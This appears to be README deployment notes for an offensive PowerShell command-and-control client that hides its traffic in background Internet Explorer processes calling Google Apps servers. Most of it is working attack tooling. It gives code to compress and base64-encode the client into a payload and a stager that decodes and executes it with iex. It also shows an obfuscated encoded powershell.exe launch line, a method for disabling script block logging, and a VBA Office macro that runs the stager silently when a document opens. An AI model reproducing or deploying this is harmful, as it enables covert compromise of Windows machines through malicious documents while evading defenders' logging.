## Client Support

![Windows-Tested](https://img.shields.io/static/v1?label=Windows%20%28Tested%29&message=10&color=success&logo=windows&style=flat-square&logoColor=cyan) ![Windows-Untested](https://img.shields.io/static/v1?label=Windows%20%28Untested%29&message=8%2C%207%2C%20Vista%2C%20XP%2c%20Windows%20Server%20%28any%29&color=important&logo=windows&style=flat-square&logoColor=cyan) 

## Deployment Notes

- Since PowerShell is an interpreted language, `client.ps1` is written to limit payload size. 
- The client uses the [InternetExplorer COM Interface](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752084(v%3Dvs.85)) in PowerShell to create hidden InternetExplorer processes that reach out to the Google Apps Servers in the background. 
- The client disables _<u>process local</u>_ PowerShell script block logging using the technique outlined [here](https://cobbr.io/ScriptBlock-Logging-Bypass.html) first before continuing client execution.
- Add your Google Apps Server URLs to the `$SRV` array variable in `client.ps1`. The client will cycle through the array to load balance server connections.
- Run the following PowerShell to generate a payload:

```powershell
# read in UTF8 encoded file data
$utf8 = [system.io.file]::readallbytes('client.ps1');
$text = [system.text.encoding]::utf8.getstring($utf8);
# compress payload into one line
$text = $text.replace("  ","").replace("`n","").replace("`r","");
$bytes = [system.text.encoding]::utf8.getbytes($text);
# compress unicode payload using gzip
$buf = new-object system.io.memorystream;
$gzip = new-object system.io.compression.gzipstream(
    $buf,
    [system.io.compression.compressionmode]::compress);
$gzip.write($bytes, 0, $bytes.length);
$gzip.close();
# base64 encode compressed payload
[system.convert]::tobase64string($buf.toarray());
$buf.close();
```

- Copy the above base64 encoded payload and paste it into the following script and replace `<PAYLOAD>`:

```powershell
$d=[system.convert]::frombase64string("<PAYLOAD>");
$m=new-object system.io.memorystream;
$m.write($d,0,$d.length);
$m.seek(0,0)|out-null;
$z=new-object system.io.compression.gzipstream($m,[system.io.compression.compressionmode]::decompress);
$s=new-object system.io.streamreader($z);
iex($s.readtoend()); 
```

- Save the previous script with your `<PAYLOAD>` as `stager.ps1` and run the following PowerShell:

```powershell
# read in UTF8 encoded file data
$utf8 = [system.io.file]::readallbytes('stager.ps1');
$text = [system.text.encoding]::utf8.getstring($utf8);
# compress stager into one line
$text = $text.replace("`n","").replace("`r","");
# convert from UTF8 to Unicode (PowerShell.exe needs base64 Unicode)
$unicode = [system.text.encoding]::convert(
    [system.text.encoding]::utf8, 
    [system.text.encoding]::unicode, 
    [system.text.encoding]::utf8.getbytes($text));
# output base64 stager
[system.convert]::tobase64string($unicode);
```

- Copy the base64 encoded stager and paste it into the following command by replacing `<STAGER>`:
  - More information about PowerShell obfuscation can be found [here](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf)

```
powershell.exe -nOpR -nonI -eNc <STAGER>
```

- If you are looking for a VBS macro for embedding your payload into a Microsoft Office document, here is one that uses the same `<STAGER>` from the previous steps:

```vbscript
Private Sub run()
  Dim cmd As String
  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <STAGER>'"
  Set sh = CreateObject("WScript.Shell")
  res = sh.run(cmd,0,True)
End Sub
Sub AutoOpen()
  run
End Sub
Sub AutoExec()
  run
End Sub
Sub Auto_Open()
  run
End Sub
Sub Auto_Exec()
  run
End Sub
```

- Here are some fun PowerShell test commands :wink::

```powershell
(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')
$e=new-object -com internetexplorer.application; 
$e.visible=$true;
$e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
```

## TODO:

- [ ] Add better handling of orphaned child `iexplore.exe` processes due to errors in `client.ps1`

